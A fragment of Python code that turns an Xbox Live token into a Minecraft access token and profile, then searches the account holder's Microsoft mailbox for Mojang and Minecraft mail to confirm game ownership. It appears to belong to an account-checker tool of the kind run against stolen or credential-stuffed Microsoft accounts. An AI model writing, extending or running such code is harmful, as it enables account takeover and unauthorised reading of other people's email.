                                 "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=10)
            xd = xr.json()
            if "Token" not in xd:
                return None, None
        xsts_token = xd["Token"]
        uhs = xd["DisplayClaims"]["xui"][0]["uhs"]
        mc_auth = sess.post(
            "https://api.minecraftservices.com/authentication/login_with_xbox",
            json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
            headers={"User-Agent": UA, "Content-Type": "application/json"}, timeout=10)
        if mc_auth.status_code != 200:
            return None, None
        mc_token = mc_auth.json().get("access_token")
        if not mc_token:
            return None, None
        mc_profile = sess.get(
            "https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {mc_token}", "User-Agent": UA}, timeout=10)
        if mc_profile.status_code == 200:
            data = mc_profile.json()
            return data.get('name', 'Unknown'), data.get('id', '')
        return None, None
    except:
        return None, None


def check_minecraft_via_mail(sess, access_token, cid):
    return _search_mail(sess, access_token, cid,
                        "from:noreply@account.mojang.com OR from:noreply@email.accounts.mojang.com OR minecraft OR mojang")
